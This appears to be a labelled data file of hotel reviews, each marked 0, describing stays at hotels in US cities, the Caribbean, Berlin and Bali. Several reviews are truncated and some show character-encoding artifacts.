"good, but small room we stayed at the tuscan inn as part of a vacation to the sf area. the main reason we chose this hotel was because of a referral from a friend and also the reviews found on tripadvisor. it was an above average hotel, but i have to mark it down due to the size of the room. we had a king room and it was tiny! there was barely enough room to walk around the bed. the bathroom was also small; it was difficult to close the door once inside to avoid the door hitting you (no joke!). other than the small room, the location was great and very close to all the attractions of fisherman's wharf. i thought the $29 per day parking was ridiculous, but i hear that's the standard in sf. we experienced no noise problems while staying here, but we had an inside courtyard room. the staff was not overly friendly nor helpful. the concierge, daniel, was also not that much of a help. if you were simply asking for directions, suggestions, or general information, he acted a bit snooty. however, i witnessed other guests buying tour tickets through him, and he was much nicer. we were only around for the wine reception for one night, and it was much too crowded. it's a nice touch, but the lobby is not big enough to host such an event. all in all, we would stay again at the tuscan inn for the right price.",0

"so so hotel stayed there in oct 06 with husband and 21 year old daughter. reception staff not overly friendly but polite. waitresses,shuttle bus and gift shop staff very friendly,helpful and welcoming. we were given a room in the furthest block from reception on the 4th floor. long corridors, abit gloomy and very quiet. would not have liked to have walked back to our room alone and would not have let my daughter. it felt a little bit eerie and too remote from the main part of the hotel. room was big and clean though and had a small balcony overlooking the car park! free shuttle bus to universal/citywalk and will drop off/pick up from metro too. on second day access key to complex and rooms would not work.after traipsing back to reception was told we were only booked in for one night. had to show them invoice to convince them it was two nights. finally gave us updated keys but no apology for inconvenience or attitude. hotel was quite a way out from centre of la which at first was a little disappointing but after going into the centre and seeing the amount of homeless and druggies was glad we were staying a little further out. would not return to la as second visit now and not too keen on it but if i had to ,would return to beverley hotel as long as i was with a couple of other people. decent enough hotel as long as there is a crowd of you. ask to stay in part of complex nearest reception.",0

"this place is perfect anyone looking to do new york, whether on a budget or not should check out this place. i found it by looking on this site - we stayed for five nights and it was just so clean and good value for money. i'd read horror stories about getting bed bugs even in the most expensive hotels. not here tho!!!! you get a shower and basin in your room, a comfy double bed and clean towels and maid service every day. the staff are really friendly and you feel like you have your own appartment! no tacky neon lights.. and what a great area chelsea is. loads of great bars, restaurants, clubs and handy for the subway too. wholeheartedly recommend this place, u must book!",0
"elegant european masterpiece - stop your moaning!!!! i feel obliged to write this given the complaints i read from other reviewers. what a bunch of perfectionists. this hotel was great from check-in to check-out. the staff were without exception attentive, helpful polite. the public spaces sparkled. loved the pool and the bar. the ballrooms were amazing. our room was spacious with a view of the park the outdoor ice-rink. it felt individual (not like a chain hotel) was spotlessly clean. i cannot understand complaints from other reviewers about the fascilities. if you want to stay at a hilton/ramada etc etc then please feel free. leave the biltmore to those travellers who appreciate old world charm with great service. i would choose to ban the business travellers as they just spoil the ambience of places like this. i would stay in this hotel above pretty much any other i have visited in the states and i have stayed in many of the very best. thank you to all who made this stay so memorable.",0

"A great find! I was extremely happy with my 2 night stay at this hotel. I was travelling on my own, but given a double room (2 twin beds pushed together), which had tons of walking space around both sides of the beds. There was also a double wardrobe, flat screen TV, desk and roomy sized shower room. There are squeezy containers for hand soap and shower gel fixed onto the walls. The rooms also have air-conditioning, which was invaluable in the heat. I found the bed to be extremely comfy. The hotel only opened in April 2008, so everything still looks and feels clean and new. One of the key things that I was looking for when searching hotels was the proximity to a train stop. The hotel is right outside the entrance to Samariterstrasse U-Bahn (metro) station. NB: Metro stations in Berlin often have exits at either end of the (long!) platforms. To get out at the correct exit for the hotel if you are travelling FROM Alexanderplatz (one of the main transport hubs), turn RIGHT as you leave the train and walk to the end of the platform. Then take the *left* exit - as you get to street level, you will see the hotel directly in front of you.My accommodation was room-only, so I can't comment on the breakfast. There is a bar downstairs in the lobby area. There is also wi-fi access in the hotel, but if you don't have a laptop, then there is an internet cafe just a couple of minutes walk away on the opposite side of the road (ask at reception).I would definitely stay here again when I next go to Berlin, and would have no hesitation recommending it to my friends. It may look a little out of the way on the map, but from leaving the hotel to getting to Alexanderplatz (including buying a ticket on the platform) takes less than 15 minutes.Tip: Buy a day metro card (é§?.10 for zones A and B, which includes Tegel airport) if you are making more than 3 journeys (single journeys including transfers on any type of public transport within 2 hours cost é§?.10). *Don't* forget to vali",0

"nice hotel; i hope the area catches up with it this hotel's best service is undoubtedly its valet parking. the service is amazing. i never waited more than a minute or two for my car. in fact, there are some rates that include unlimited valet parking in it; however, be careful. i paid the higher rate to include this amenity and was charged for the parking anyway. the readily amended it when i brought it to their attention. (maybe they're accustomed to having to do so.) the area surrounding the hotel is very dicey. so, the hotel offers a free service in which they will take you or pick you up from any location within a three-mile radius until 11:00 p.m. this can be especially helpful since the streets are quite confusing with lots of one-way streets. they offer free starbucks coffee all day, which is especially nice if you have travelled and are now in a different time zone. the staff at the grand cafe was very friendly and accommodating.the room was cleaned early in the day, which is somehting that i just haven't seen happen in most other hotels.we requested early check-in for two rooms and, although they weren't ready when we arrived, they were available to us within the hour.prior to this trip, i stayed at the hollywood renaissance hotel - and i cannot begin to list all of the problems that i encountered with them. it was so bad that they offered me a free room on my next trip. oddly, i haven't been able to get the manager who offered this compensation to return my call. try the omni los angeles. it's a part of the city that many people visiting l.a. don't see - but should.",0

"Unique, exceptional service - a gem! I haven't been here but an hour or two and I've already found my new home away from home in Dallas.Bear with me, this will be a long review, but I think the beauty of the Belmont is truly in the details...I'm in a Garden Standard Room ... #38 to be exact ... a corner unit with 3 windows (on 3 sides of my room!!) and a gorgeous view of the Dallas skyline. It looks like a small apartment - I even have a chair out on the front porch of my unit.The room is adequately sized and a touch minimalist with the decor - very comfortable, and decently appointed.Just finished a delicious dinner at The Cliff Cafe, the onsite restaurant. I'm now enjoying their signature Belmontini in the lounge and using the free internet access.The staff is ridiculously friendly. From the valets (complimentary parking with your stay and they carry your luggage to your room and bring you a bucket of ice) to the desk staff to the waiter at the restaurant to the bartender - it's evident that the staff here are genuinely pleasant, and very concerned about providing a positive experience for guests.Don't let reviews about the neighborhood bother you. There's not much around - yep, it's transitional, and in a few years this place will be surrounded by condos and a Starbucks. Matter of fact, the guy who owns the hotel owns more land around here and is working very diligently to bring the neighborhood up. (Search for an article in the Dallas Morning News from about a year ago if you don't believe it.) In the meantime, enjoy a bit of an oasis!Do not stay here if you are looking for the standard, same-furniture-as-the-hotel-I-stay-at-in-every-city-I-visit. If you want a big chain hotel, for heaven's sake, stay in one - you'll get exactly what you've come to expect.If you want a historic, quirky property that preserves the original 1940's motor court architecture up",0

"perfect find! we stayed at this holiday inn for five nights in the beginning of december at the start of a mini tour of the states. we stayed in this hotel to explore la and can honestly say we were not dissapointed. i had emailed the hotel prior to our stay to advise that it was a surprise for my partner (this was his 40th birthday present!!) and when we checked in the receptionist wished steve a happy birthday and advised that they had upgraded our room to a larger corner room with a fridge - fantastic!! we checked in to our room on the fifth floor and it was spacious and extremely clean. you can tell this isnt a brand new hotel but everything was in good working order and kept extremely clean and tidy. we had lots of storage space, a very comfy king size bed and a nice balcony overlooking the hollywood hills and tennis courts. there was a function room below and we did experience some noise, but this finished reasonably early and i cannot say it bothered us. there are tennis courts, a gym, swimming pool and a small shop at the hotel. there is also a restaurant and bar, we only used the restaurant once for breakfast on the day we left. it was very nice but seemed very quiet in the evenings. ironing board iron, tv (not flat screen), hairdryer all in room. no safes. parking was not a problem - charged $12 per night. easily accessible to get to all the sights. right off the interstate, so you could hear the traffic but nothing major. it was nice staying at this hotel, as you felt safe and it was in a nice residential area but close to all the attractions - would definately reccomend!",0

"at home at the w los angeles i am another w los angeles guest surprised by the negative reviews online of this property. i had a small problem getting a light bulb replaced in the room (it took a call to the front desk, then two follow-up calls on their part to see if it had been done before it was actually accomplished), but i don't consider a burnt-out bulb to be a big problem, so fixing it right away wasn't something that irritated me. so i might agree that perhaps the staff is not up to the typical w standard for coordination, but i did not at any time find anyone unprofessional or rude. i lived in westwood for a while and feared that the location would mean lots of noise and drunken carousing outside, but their street is away from westwood village and very quiet. the building seems nestled in a private jungle, and i found that its reputation for being dark was well-deserved. at night, they keep the lobby area relatively dim and use projections on the wall for decoration. i was impressed by the execution of this, since it can be glaring if not well integrated. the use of projection along with the closed-circuit tv in the elevator (not recorded or monitored, just for entertainment inside the elevator) is a nice nod to the industry of the host city.the rooms are very big for hotel rooms (i had the lowest level of room), and while it is true that they do not have lots of light fixtures, during the daytime, the windows that ran along the entire side of the room (and open wide) let in plenty of light. but yes, at night, the rooms seem kind of dark. the decor is nice, but a bit reserved for a w. again though, there is a tie-in with los angeles in the photos of the city at night that adorn the walls.the bathrooms are huge, and have a stand apart from the vanity for locating your own toiletries. that's a nice touch.as for the staff, i found everyone to be amazingly friendly, putting forth a lot of effort to achieve the w goal of making you feel like you're coming home when you arrive at the curb. the welcome ambassador (or whatever they call them) that greeted us upon arrival remembered my name, my interests, some amazingly obscure details from brief conversations we had and offered some amazing tips each time i passed through the doors.as for the internet access not working, i first experienced that problem, but when they sent an engineer up to the room, he explained that the little black boxes that are inline between the ethernet from the wall and your computer often fail, so if you just use the blue ethernet cable from the wall and plug it directly into your computer, it works like a charm. i am surprised at the report from the previous reviewer that had employees talking about it being a widespread problem, since even the bellhop seemed to think that might be the problem before the engineer arrived. perhaps they only recently discovered this workaround.pros: amazing welcome staff, friendly (if not well-coordinated) staff in other areas, lush surroundings, good public area design, beautiful views, that killer w bedcons: expensive parking rates ($24/day, i think), dark rooms (at night; maybe a pro for some), not very funky room elements for a w, although i felt the lobby made up for this",0

"nice hotel for business stayed here for business - attended a conference held at the hotel. the ballroom/converntion area of the hotel is pretty big and they seemed to service it well. hotel was overbooked so i got upgraded to a suite on the top floor - level called penthouse.great, great views of the city and mountains in the distance. room was nice but nothing extraordinary. very roomy, alot of open space in the suite area and bedroom. i used the online concierge service to make special requests and received a confirmation letter of those requests being fulfilled when i checked in.nice, large pool area - was closed off the day i was there for a private photshoot/commercial. lobby is large and open with a starbucks, 2 bar areas and a restaurant. had dinner in restaurant - food and service were good - but menu is limited. (have sushi bar too) really nice outdoor area with firepit for drinks adjacent to pool - good for evening cocktails/appetizers.overall, was fine for the purpose of a business trip but not sure if its an ideal location for a vacation with family/firends.",0

"Absolutely Beautiful Vacation We stayed at the Majestic from Jan 24 to Jan 31/07 to attend our son's wedding, along with 42 other guests. We found this resort beautiful and the staff went out of their way to make this a very memorable occasion.The rooms were gorgeous, very well laid out and clean. King size beds, pillows a little flat, but if you asked you were provided with better pillows. No washcloths but clean towels daily. Fridge stocked daily. We did leave gifts for the maids daily but I was disappointed not to see the creations they make out of towels and flowers. Our bed was turned down daily and I did notice that our bed was changed daily. The food was excellent. We did have some people in our group that are vegetarians and there was always a variety of foods that they were able to eat. I think that anyone that complains about the food, first of all you are in a different culture and they do cook with oils and different spices. But on the whole there is no reason for anyone to go hungry and not be able to find something to fill them. From fresh juices, fruit, eggs, meats, breads, you name it they had it. All the speciality restaurants were delicious, except for the chinese which no one in our party enjoyed. Seafood, steak and buffet were scrumptous and I am not kidding.Beer, liquor, liquors they had it. Be careful as we were advised that the fruity type drinks act like a laxative and we all know what happens with laxatives. I asked for hot chocloate with Baileys and I think they thought I was nuts drinking this in the heat but I had quite a few of these. I witnessed people asking for the premium liquor and again it was provided.The Casino was alot of fun and we did have some winners in our group. Staff not always very helpul but who cares, you are there to have a good time and that is what we did. We ran out of money and my husband and BIL went to the 2nd resort past our resort as they have a bank on the premises. Bank is closed on Sundays and in less than 10 minutes we had american money. We went by water taxi ( 10 min boat ride)to shop down the beach and it had some different stuff . Also shopped at the market outside the resort ( 10 min walk go in earling morning as very hot) and again able to bargain. I found some of the locals got mad at you if you didn't give them what they wanted but still able to haggle with them.The younger people in our party went to the disco quite regularily and they had a great time. Didn't hear any complaints so they must have enjoyed themselves. I did hear there is a excellent eatery beside the disco that serves good burgers, fries ect.The beach and grounds are absolutely beautiful. Very clean, garbage picked up daily. I was on the beach very early, every am and the staff would have all the lounges straightened in rows and that is the first time I have seen this at any resort. We took air mattress's and had a awesome time in the waves. Also the snorkelling in front of our resort was good. The kids used the boogie boards and had a blast.Our son's wedding took place on the Saturday and again I can't say anything negative. Decorations and flowers were very nice, Mario the wedding co ordinator went out of his way to accomo",0
"kids will love it here second time in two years to punta canajust returned from gran bahia and was very happy with our stay but we have stayed at the paradisus in punta cana and am basing my comparison on th at resort.we have an 8 and 5 year oldnow, we were extremely happy with the bahia but it is not a 5 star resort.we stayed in the diamond club which offered private check in, private pool, beach towels to the room etc. nice perk, but you can go with out. the private pool is very very quiet, no activities, dull actually. the benefit was private restaurant for b/f and lunch, quite nice. the rooms are average, neat clean , well kept. you have to pay for the room safe which i found odd as you are paying a good buck and they penny pinch you for $40. room safe was included at the paradisus.b/f and lunch buffet in the main restaurant, simply awsome, huge selection, dont bother with the snack bar by the pool.al'carte resaturants, extremely disappointing, portions were very small and only one choice from each catagory. wine by the glass only, unless you wanted to purchase a bottle. dont get me wrong, the food was excellent, but this is supposed to be all inclusive. french, mexican were the best for us. paradisus you could order 12 of the same entree and they were happy to accoma",0

Not the Best Contiki Experience This hotel from the get go was pretty awful!!!!! we got to the hotel and checked into our pool terrace room which i may add was not direct pool access. we were shoved in the corner of the building right near the stair case. A pool terrace room was suppose to have the pool at my door step. there was only about 6-8 pool terrace rooms that actually had direct access. my advise would be just book a pool view room coz you never know what you are ganna get. the hotel was only about 35% full and was quite dead until about dinner time and drinks at the bar. the music blarred even if there was no people around. the room wasnt all that bad apart from the fact that the towels were well past their use by ,0
"Not A Good Idea to Stay HERE!!! This Hotel is highly over rated and I would not recommend staying here. I met a couple last week on an aircraft considering staying here and they begged me to go on this site and write about my experiences. The following are issues we had with the resort:* check in was disorganised, we wait 1 hour to get our room.* When we received our room there were no towels or face cloths we had to beg for these two items. * I originally booked the Hotel as a Breezes resort and it was classified as a 4 1/2 star and it is barely a three star. * The evening show is not worth attending * The rooms are old, the beds were hard and old, the room was also infested with ants. We were told after the infestation not too leave food in the room i.e. bars and candy. There is also a mold problem in the rooms. * Dinner reservations were made for us and when we tried to change it we were not accoma",0

"Does not yet live up to its potential I write this review to advise other travelers of our recent experiences at the resort and in hopes that the Palma Real will recognize they have much work to do before the resort reaches its full potential. I have no doubt they will get there evetually and one day the resort will be a top destination in Punta Cana.   I will begin this review by saying that the facility itself is absolutely stunning. From the moment we walked onto the property our mouths hit the floor. You can't help but be awestruck with the shear opulence of the resort. The architecture, grounds and layout are absolutely beautiful and 1st class in every way.  We booked several rooms for those traveling in our party ranging from oceanfront with royal service / butler (Royal Imperial Romance Oceanfront Jacuzzi Suite) to ocean view rooms without royal service (Regal Oceanview Jacuzzi Suites). There were numerous check in problems and some ongoing issues with a couple of our rooms throughout the week. The only real difference between the rooms themselves were one was oceanfront and others were ocean view, Be aware ocean view may only mean a partial ocean view....even if you just see a glimpse of the ocean off in the distance when standing on your balcony it is still considered ocean view. The rooms themselves were all very nice and well appointed.  There are three pools at the resort. The main pool is around 13,000 sq feet with a swim up bar...built in lounge chairs and built-in unheated Jacuzzis. Most amazing pool I have ever seen. The other pool is for Royal Guest members only and is much much smaller. The other pool was somewhat larger than the Royal Guest services pool but did not seem to have many people using it as it was somewhat removed from the main areas of activity. All the pools surrounded by Palapas with lounge chairs or beds. All in all the pool areas were very impressive and well laid out.  The beach has gorgeous soft white sand with tons of palapas with loungers or beds. Big drawback / disappointment however is if you venture more than 10-15 feet from the shoreline into the water you are standing on beds of seaweed. The entire beachfront of the resort is like this so if you love swimming in the ocean you might be in for a disappointment. We were pretty turned off by it and as a result did not go back in the ocean at the resort. The beaches of the resort next door and further down do not seem to have this problem as you could venture much much further out into the water without coming in contact with seaweed. Not sure if the resort can do anything about this without damaging eco system, etc but they really need larger seaweed free areas to swim in the ocean off their beach.....10-15 feet out doesn't quite cut it. Unfortunately any praise we have for the resort ends here. It is really unfortunate but the quality of service and other aspects of the resort do not yet match the quality of the facility itself.  Royal service was a royal disappointment. Seldom during our visit did we even see our butler and getting the people in royal service to do anything usually required us to ask numerous times before our requests were met. I am still not sure what we got for the premium we paid for this service but their royal service needs a total overhaul and the people who are running it need to be sent to classes on service. From our perspective it wasn't much more than a lip service department. I will leave it at that.. Bartenders were generally great and fun. I think in general the overall service at the facility is a reflection of poor management or lack of it or an indication that the resort is horribly understaffed.  The organized activities at the facility were pretty much non-existent unless basket weaving or wine tasting is your idea of a fun time! What a disappointing area this was for anyone who likes to engage even occasionally in some fun organized activities. Where are the play makers??? Hello!!?? Only one word could describe their activities and activities people....BORING!!! If you are looking for a little more action than just vegging out under a palapa with a drink in your hand for a week you'd be best advised to consider another resort or urge the resort to get their act together in this area. Hopefully the resort will ultimately recognize people are down here for not just relaxation but some fun as well. The place is enormous so they could easily accommo",0
"good deal for the price the adante hotel is located in a convenient spot and is a good base for a weekend of sightseeing. the rooms are what you'd expect from a budget hotel: small, utilitarian, and lacking the amenities that you'd find in higher-priced hotels. the rooms are very clean, and the management was professional. i had no problems checking in or out. the rooms were quiet, although you could hear the sounds of the city below with the window open. the window was open because there is no a/c. this is not a horrible thing given the frequent breeze in sf, but you'll want to know that there's no a/c ahead of time. i lucked out with a weekend of beautiful cool weather, but you'll want to check the weather forecast before booking here to ensure you're not in a heat wave. the murals painted on the walls are kind of kitschy and fun in a weird way. i would stay here again if the weather was cool enough.",0
"price was right pleasantly surprised at $69 night. front desk was not helpful, but who cares...for $69 you get a clean, fairly-large room, central air, refrig/micro, free (but sparse) breakfast buffet. stayed there because it was near banner hospital.",0
"oh how it has changed! we have stayed at the roosevelt many times over the years and last year will probably be the last time unless there is a change in ownership.we have seen this once beautiful old hotel,loose all it's character as it was gutted in the name of modernisation.gone are the comfortable furniture to be replaced by hard,plain and ugly chinese style stuff.we lost count how many times we banged our shins on the awful bed,whose mattress was too small for the frame,and oh so low.the wonderful art deco was replaced by bamboo sticks,but worst of all the lobby was cleared of seating for the guests and hired out to private functions,while guests were driven into what once was the basement and is now the reception area,small and like sitting in a pit,we sat and watched the complaints from other guests fall on deaf ears.it was impossible to sit in the evening and have a drink at the small bar as there were only a few chairs or high bar stools.front doors were locked every time a private party took over the old lobby so we had to walk around to the back door and dodge cars as we crossed the carpark.the mezzanine,which had once had a display of pictures showing the history of hollywood,was reduced to a drafty open gutted space,said to be a bar one day..all the friendly staff who had been there for years left,to be replaced by others who seemed more and more stretched to service the private functions rather than the guests actually staying in the hotel.this is a hotel that has completely lost it's way..is it a hotel or a collection of function rooms? what really has angered us is the fact the hotel's website is so misleading,not a word about the still ongoing building work...it's been at least 3 years now since it started and still isnt completed.we doubt it ever will be.it is sad as we really loved the old roosevelt.",0

"nothing special here i stayed at the hilton squaw peak for a conference. as an earlier reviewer said, the bed is extremely comfortable; however, the property itself is a little rundown...missing roof tiles, tired carpet, that kind of thing. my room was on the fourth floor of one of the main buildings, and to get there you ride one elevator--by that i mean there is no service elevator, so half the time you're trying to negotiate around giagantic serivce carts or other maintenance equipment. very strange. the part of the hotel i stayed in is very reminiscent of a super 8, or other cheap motels with outdoor walkways--nothing special and certainly not resort-y. i do not know what the conference planners where thinking when they booked this spot; it's clearly a place for families with little kids, and it's minutes from...nowhere. not my thing. i asked that the toilet in my room be fixed: it ran all the time. it was fixed so that it dripped all the time. both were equally annoying and sleep-depriving. my room was very small--european small--and was dark, dark, dark. the trash cans are inadequate, and there is not one at the desk--although again this is not a hotel for business travelers. the conference planners must have been having an off day.",0

very nice clean place to stay the hotel was extremely clean as if it were new. the beds were the most comfortable i have slept in in a long time. the maid service was great; anything asked for was given with no hesitations. we had total control over the air conditioning which worked great. staff was friendly and helful. the lobby was always spotless. the hotel was literally 2 minutes from the airport which can be a plus and a negative. if you are just stopping over it's a great location but may not be a great location if vacationing throughout the l.a. area (too much traveling). i was very happy with this hotel.,0
"won't be back just wanted to let you know about our stay. we usually stay at the renaissance in west hollywood. comparing the w to the renaissance, i would give the w a c- and the renaissance an a+. this was our very first time using starwood pointsé¥î?e have been loyal marriott rewards people for many years. é¥?when we arrived at the w the bellman encouraged me to go check in and leave my bags there for him. i was concerned that the luggage and the loose bag and sweatshirts would get separated with several guys doing the work. sure enough, as i was checking in i saw the cart come in and the loose items werené¥?? with my luggage. he said é¥?·¥h, i was wondering who they belonged to?é¥?br/>é¥?we checked in on points. the reservationist gave us a room directly across from the elevators which we heard loud and clear from our room. to compareé¥în our points at the renaissance or any marriott, they usually upgrade us and always make sure that we have a fabulous location and room. é¥?the bellman was not busy, but i was told to go ahead to the room and wait for my bags. wait is just what i did. feeling that there was absolutely no reason to wait since it wasné¥?? busy at all downstairs, i called the front desk to request that the bags be brought up soon. at the renaissance, the bellman waits while you check in and then follows you in the same elevator to your room with your bags. no waiting necessary!é¥?the rooms were very inadequate for traveleré¥??? needs. ité¥??? as if the hotel never did an analysis of basics that traveleré¥??? need. there was no place around the sink to put anything except a toothbrush and the toothpaste. there was no makeup table and mirror. the closets were tiny and there were no dresser drawers big enough to lay more clothes in them, except for the small ones in the closet. at the renaissance, in fact, at every marriott, there is always a makeup area with a mirror. there are always large dresser drawers. the sink area has plenty of room to lay out your toiletries.é¥?i called for the concierge and the operator put me on hold (with my permission), but then she came back on the line sounding very flustered and asked if she could take a message for the concierge. surprise, the concierge never called me back. at the renaissance the operators never get flustered, in fact, they always say é¥?·elightedé¥? é¥?when we went down to the pool late sat. afternoon it was crowded and there wasné¥?? a seat to be had. we let the guy there know of our predicament. i think he had several optionsé¥î?¬irst, he could have let us use one of the cabanas that were free since it was so late in the afternoon and there were no signs of it being occupied. second, he could have watched us go to the bar and come and got us when some chairs became free. there was no follow up. é¥?needless to say, we woné¥?? be back.",0

"Not so much a ""Dream"" I will start this entry by stating that we have stayed at the Dreams resort in Cabo San Lucas, Mexico and it was absolutely amazing! Don't let this review detour you from traveling there!Now...to Dreams Punta Cana...: Upon arrival at the airport, we were highly impressed with how quickly and easily the entry into the country, baggage claim, and finding our bus was. The hour and a half ride to the resort was absolutely brutal! We were so nauseated by the time we arrived that we could hardly stand. The potholes are terrible, our driver swerved to avoid potholes making you very dizzy, and we had to stop at five resorts before arriving to ours. When we got out of the bus, we headed toward the check in counter where they finally came to give us a cold towel. We never did get champage--even after asking for it and waiting for approximately 10 minutes. Check in was relatively easy--no problems there. Our room was actually ready upon arrival, which I was glad to see that it was.We made it to our room, the bag boy had our luggage waiting, and then came the disaster! Our refrigerator was not cold, there were drink and dirt stains on our couch and loveseat and rugs, the bathroom area was extremely ",0

"fantastic stay at omni hotel we have just returned from a stay in the omni hotel at california plaza, los angeles. we booked this hotel because of the very good reviews on trip advisor. it was fantastic - better than expected. we choose a room at club level which included continental breakfast and drinks from 5.00 - 8.00 pm each evening. the bed (as advised by a trip advisor user) was pure luxury. you just would not want to get out of it. room bathroom just perfect. our room no 1615 was positioned on a corner so we had 2 views. through one window we could see the famous 'hollywood ' sign on the hills and through the other window we had great view of the waterfall plaza below. breakfast included hot porridge, fresh fruit - all kinds, cold meat, smoked salmon, egg s florentine, bacon, sausages etc, etc. not to mention the beautiful muffins pastries. the menue was slightly different each day. evening drinks included cheeses, pancakes and tasty hor'devours. all the staff we encountered were extremely helpful friendly. don't forget to become a 'select guest' with the omni. do this through their website. taxis always available outside hotel. this hotel is just great.",0
"great lax location we stayed here for 1 night before an early departure from lax. the hotel is easy to find and less than 5 minutes from departure terminals at lax. it is part of the marriott chain which i like to use whenever possible. it is a beautiful hotel, very nicely appointed. the check-in desk clerk was very hasty and not overly friendly, but the concierge made up for it. they were very helpful with questions etc.the rooms were average size, the beds were wonderful pillow tops and very comfortable. the bathroom was good size with nice amenities. there was a small fridge in the room as well.the airport shuttle was very convenient, it runs continuously 24 hours every 15minutes. no reservations are required, just proceed outside and catch the next bus.would certainly stay here again for the convenience to the airport. it is also very close to the rental car drop-off locations.",0

"top notch facilities i recently stayed here in july of 2003 for the second time and i definitely will be back for a third before the summer is over. the suites are huge! the first time we stayed in the north tower and our second time we stayed in the south tower. both are excellent! there are about 10 pools all over the property which makes it very convienent no matter where your room is located. the entire staff is so friendly and helpful, especially the front desk who went out of their way to make sure we were happy. we have stayed at other resorts in the valley with water features, but nothing beats squaw peak! south mountain is a rip off because they charge to get into the waterpark on their own property. we also visited the hyatt gainey ranch, which is extremely over-priced ($170 per night) and small rooms. if you are coming to phoenix or live in the valley and are needing a getaway, i would definitely stay here!!",0

"nice hotel - awkward location here were the good things about this hotel. the staff was very friendly and helpful, the room was spacious, they had a free limo shuttle around the city between 7 and 3, the wake-up call was a real person, they delivered free coffee or tea to your room and left it outside the door with no knock (meaning no tip required) at the time you ordered it for, lovely turn down service with chocolates, tv in the dressing area and better than average excercise room.i thought the location was awful... atop very steep hills and you have to really climb or take public transportation. granted the cable car was right out front, that is not an easy means of transporation if you have to work there. the free limo in the mornings worked well for me.while they do have high speed internet access, it cost $9.95 a day. the desks in the room were tiny and if you had to work, there really was no space.the first room they gave me had a tv in an entertainment center but when you pulled it and even turned it as far as you could, you couldn't see the tv from the bed. they switched rooms for me , and while this tv could be seen from the bed, the tv was along the left hand wall from the bed and the tv had to stick way out into the room and the entertainment center door now blocked the door into the hall. very awkward set up.if you don't want to eat at this hotel which is very expensive ($20) for breakfast or the neighboring top of the mark or fairmont (also very expensive) you must get down from the hill and then back up the hill. there is nothing else nearby.this location is awkward for business travellers and the room amentities don't cater to such. if i were on vacation, i think something closer to the wharf or the downtown where walking isn't such a challenge would work better.",0

The lobby is nice and the front desk people were friendly, especially when one considers it was not only New Year's eve, but the Sugar Bowl and almost the BCS championship game. So things were bustling. Our room was clean and had a few amenities.The bad news is: our room was so tiny that our bed faced the wall at the foot of the bed, and was only about 18 inches from that wall. Had I been any fatter I may not have been able to pass without turning sideways. It was so Spartan I could have been in a monastery. This hotel has few, if any, rooms with windows as it appears to have been a series of warehouses converted to a hotel. My son's room at least had a border around the top of the wall and was spacious with hardwood floors. Ours had the hardwood floors but was devoid of any character, in addition to being tiny.I guess the price was good when considering the location and the ",0

"Lovely Hotel, Lovely Setting The Samaya Hotel was a lovely smallish hotel, directly on the sea front on Semenyak Beach. Anyone worrying about the noise and bustle of Kuta, do not worry. This hotel is far enough out of Kuta to be away from it. It is 5-10 Minutes walk from some very good restaurants, with good food and good facilites. The food at the Hotel is also extremely good.The Villas at the Hotel are lovely, each has its own individual small swimming pool and each is contained within a walled perimeter, so privacy is assured. The rooms themselves are well appointed and the bathrooms are excellent, with a big sunken bath, as well as a nice seperate shower cubicle.During the time we were there there was some buliding work to the restaurant, which although created a big of noise during the day, we then had the hardship of having meals under the stars in front of the ocean. The building work will be finished by July of this year 2006, so that will no longer be a concern to those travelling after this ",0

"fab location and fantastic staff. i have just returned yesterday from 10 nights at this hotel.well where do i begin the good bits first:all the staff are very friendly,polite and helpful.the beach was immaculate and always clean,there was also a cafe type area with umbrellas overlooking the beach which was lovely.the swimming pool and garden area was always very tidy and felt like walking around your own private garden.the location was perfect you could walk out the hotel and onto a street which had lots of restaraunts and bars and shops so you did not feel stranded which has happened to me before.the thursday night show was very good and the restaraunts and lunch prices were very reasonable.the weather was great with a nice breeze ,and we found a restaraunt called donalds across the road and slightly to the left which had fab food and was about ?¢10 a night for us for 2 courses and drinks his restaraunt is by far the busiest every night and had a good choice of local,european and seafood also.there is also a good restaraunt left out of the hotel which has a good live band every evening and does really good food too.we went on a few trips which we enjoyed and went to the waterboom park in kuta which was so clean and empty so that was a good day out for a change.the only 2complaints i have are firstly the lack of sunbeds ,it was a nightmare certain nationalities were getting up at 7am every morning and picking all the best sunbeds either on the beach or under the umbrellas next to the pool,going for breakfast then about 9.30am lying on them all day.the pool will not open till 9am so they were reserving beds with sarongs ,books ect.this drove me mental as we never got the really good beds with the sofas on the beach ,i considered camping out one night!!but the waterpark in kuta was a great option with pools and slides and good food ect and no bed reserving it cost ?¢10 each.the other moan was the rooms really need updating they are so dark you always needed a light on to see,especially the bathroom it really was dark ,we actuallt stayed in 3 different rooms throughout the holiday due to the arguing honeymoon couple next door we had to get moved the noise was horrendous,seemingly they had been moved 4times already as guests were complaining,but we got another room so it was fine te hotel were very accomadating .the other rooms were pretty similar no better really or worse,we stayed in a bungalow also it was nicer than the standad room but i personally didnt think it was worth the extra ?¢?¢ the bedroom was nicer but the bathroom was even more out",0

"fab time! having just returned from a 3 week self planned tour of the west coast with my husband and 11 year old son i feel i must compliment the montura hotel. we stayed for the first 4 nights of our adventure and our only problem were noisy neighbours on the first night. the next morning we mentioned it to the concierge when asking for info on the area ( all of which we got plus maps etc - extremely helpful) - within seconds she said the 'noisy' guests were here for a while and she would upgrade us to a club room.the bedroom was a good size , comfortable with an attractive decor - bathroom was clean but not particularly stylish so could be updated to bring it more in line with the rest of the hotel, which had a luxurious feel with attractive artwork and sculptures.couldn't hear any airport noise although we could see the planes coming in to land which my son found exciting. we used the self parking which was a little cheaper than the valet parking and just used an interior lift to get to the appropriate parking floor - no hassle at all. we had breakfast included and it was one of the best things we did - staff were polite, attentive and the cook makes a mean omelette - lots of choice. well worth a visit. p.s. used trip advisor to assist in the planning of our holiday.",0

"stay at the luxe! first of all it has a great location. right at sunset you are quickly in bh or hollywood (if la traffic allows). we had a wonderful and great stay. the staff was nice and helpful. our room was large by all means and we got everything we asked for. even when we considered switching to a (more expensive) room by the pool, they did not hesitate for a second and showed and offered us the rooms without extra charge. i stayed at numerous hotels in la and the luxe was one of the best ones i stayed at. you definitely get a very good price/value ratio. i will definitely stay there again. i might also try out the one on rodeo. for families i recommend to get a room by the pool, all others stay in the main part.",0

